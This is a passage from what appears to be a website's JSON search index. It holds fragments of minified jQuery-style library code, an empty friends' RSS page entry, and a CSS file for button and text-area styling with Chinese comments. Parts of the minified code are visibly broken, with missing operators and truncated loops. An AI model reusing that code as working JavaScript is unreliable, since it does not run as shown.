function(c){d[a]=this,e[a]=arguments.length>1?f.call(arguments):c,--b||g.resolveWith(d,e)}};if(b0||Q.resolveWith(d,[r]))}}),r.ready.then=Q.then;function R(){d.removeEventListener(\"DOMContentLoaded\",R), a.removeEventListener(\"load\",R),r.ready()}\"complete\"===d.readyState||\"loading\"!==d.readyState&&!d.documentElement.doScroll?a.setTimeout(r.ready):(d.addEventListener(\"DOMContentLoaded\",R),a.addEventListener(\"load\",R));var S=function(a,b,c,d,e,f,g){var h=0,i=a.length,j=null==c;if(\"object\"===r.type(c)){e=!0;for(h in c)S(a,b,h,c[h],!0,f,g)}else if(void 0!==d&&(e=!0,r.isFunction(d)||(g=!0),j&&(g?(b.call(a,d),b=null):(j=b,b=function(a,b,c){return j.call(r(a),c)})),b))for(;h1,null,!0)},removeData:function(a){return this.each(function(){W.remove(this,a)})}}),r.extend({queue:function(a,b,c){var d;if(a)return b=(b||\"fx\")+\"queue\",d=V.get(a,b),c&&(!d||r.isArray(c)?d=V.access(a,b,r.makeArray(c)):d.push(c)),d||[]},dequeue:function(a,b){b=b||\"fx\";var c=r.queue(a,b),d=c.length,e=c.shift(),f=r._queueHooks(a,b),g=function(){r.dequeue(a,b)};\"inprogress\"===e&&(e=c.shift(),d--),e&&(\"fx\"===b&&c.unshift(\"inprogress\"),delete f.stop,e.call(a,g,f)),!d&&f&&f.empty.fire()},_queueHooks:function(a,b){var c=b+\"queueHooks\";return V.get(a,c)||V.access(a,c,{empty:r.Callbacks(\"once memory\").add(function(){V.remove(a,[b+\"queue\",c])})})}}),r.fn.extend({queue:function(a,b){var c=2;return\"string\"!=typeof a&&(b=a,a=\"fx\",c--),arguments.length"},{"title":"朋友文章","path":"/friends/rss/index.html","content":""},{"path":"/tools/style.css","content":"/* 按钮组样式 */ .button-group { margin-bottom: 20px; } button { background-color: #008CBA; /* 按钮背景颜色 */ color: white; /* 文字颜色 */ padding: 10px 15px; /* 内边距 */ border: none; /* 去除边框 */ border-radius: 5px; /* 圆角边框 */ cursor: pointer; /* 鼠标悬停时的光标形状 */ font-size: 16px; /* 文字大小 */ margin: 5px; /* 外边距 */ transition: background 0.3s; /* 过渡效果 */ } button:hover { background-color: #005f73; /* 按钮悬停时的背景颜色 */ } /* 文本域样式 */ .output, .input { width: calc(100% - 40px); /* 宽度为100%，减去padding */ margin-bottom: 20px; padding: 10px; /* 内边距 */ border: 1px solid #ddd; /* 边框 */ border-radius: 5px; /* 圆角边框 */ font-size: 16px; /* 字体大小 */ background-color: #fff; /* 背景颜色 */ resize: vertical; /* 只允许垂直缩放 */ } .output[contenteditable=\"true\"], .input[contenteditable=\"true\"] { height: 200px; /* 设置高度 */ overflow-y: scroll; /* 添加滚动条 */ outline: none; /* 移除焦点时的边框 */ -webkit-user-modify: read-write; /* 允许编辑 */ }"}]